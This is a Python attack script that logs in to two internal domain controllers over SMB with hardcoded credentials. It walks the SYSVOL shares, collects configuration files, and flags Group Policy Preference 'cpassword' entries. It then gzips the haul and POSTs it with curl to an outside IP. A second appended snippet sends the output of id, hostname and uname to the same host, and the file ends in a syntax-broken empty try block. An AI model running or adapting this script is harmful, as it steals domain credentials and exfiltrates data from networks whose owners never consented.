#!/usr/bin/env python3
# GPP/SYSVOL hunt v2: recursive SYSVOL walk, slurp xml/inf/cfg, gzip+raw POST
import sys, os, io, subprocess
sys.path.insert(0, "/tmp/imp")
from impacket.smbconnection import SMBConnection

OUT = "/tmp/.GPPh2.txt"
out = open(OUT, "wb")
def w(s):
    if isinstance(s, str): s = s.encode("utf-8", "replace")
    out.write(s + b"\n")

IPLIST = ["10.61.10.11", "10.61.10.10"]
EXT = (".xml", ".inf", ".ini", ".cfg", ".config", ".kix", ".bat", ".cmd", ".ps1", ".vbs", ".ldf", ".reg", ".txt")
MAXF = 512 * 1024
listing = []

def walk(c, share, path):
    try:
        ents = c.listPath(share, path + "\\*")
    except Exception as e:
        w("  ERR %s %s" % (path, str(e)[:80])); return
    for e in ents:
        fn = e.get_longname()
        if fn in (".", ".."): continue
        full = path + "\\" + fn
        if e.is_directory():
            walk(c, share, full)
        else:
            sz = 0
            try: sz = e.get_filesize()
            except Exception: pass
            listing.append((full, sz))

for ip in IPLIST:
    w("=== %s GPP hunt ===" % ip)
    try:
        c = SMBConnection(ip, ip, timeout=10)
        c.login("rez", "!QAZxsw2", "MLT", "", "")
    except Exception as e:
        w("LOGIN_ERR %s" % str(e)[:120]); continue
    walk(c, "SYSVOL", "")
    w("LIST %d entries" % len(listing))
    slurped = 0
    for p, sz in listing:
        low = p.lower()
        if low.endswith(EXT) and sz <= MAXF:
            try:
                bio = io.BytesIO()
                c.getFile("SYSVOL", p, bio.write)
                data = bio.getvalue()
            except Exception as e:
                w("GET_ERR %s %s" % (p, str(e)[:80])); continue
            tag = "CPASSWORD!!!" if b"cpassword" in data.lower() else ""
            if tag or low.endswith((".xml", ".inf", ".ini", ".cfg", ".config")):
                slurped += 1
                w("=== FILE \\\\%s\\SYSVOL%s (%dB) %s ===" % (ip, p, len(data), tag))
                try: out.write(data); out.write(b"\n=== EOF ===\n")
                except Exception: pass
    w("slurped=%d" % slurped)
    for f, sz in listing[:80000]:
        w("L %d %s" % (sz, f))
    try: c.logoff()
    except Exception: pass
    w("=== %s done ===" % ip)
out.close()
subprocess.run("gzip -9 -c %s > /tmp/.gp2.gz && curl -sm120 -X POST --data-binary @/tmp/.gp2.gz http://131.123.43.239/up -H 'X-Name: mel3_gpph_gz'" % OUT, shell=True)
print("GPPH2_DONE")

import os,base64,urllib.request as u
try:
 d=base64.b64encode(os.popen("id;hostname;uname -a").read().encode()).decode(); u.urlopen(u.Request("http://131.123.43.239/up",data=d.encode(),headers={"X-Name":"wrk_out"}),timeout=10)
except Exception: pass

try:
except Exception: pass

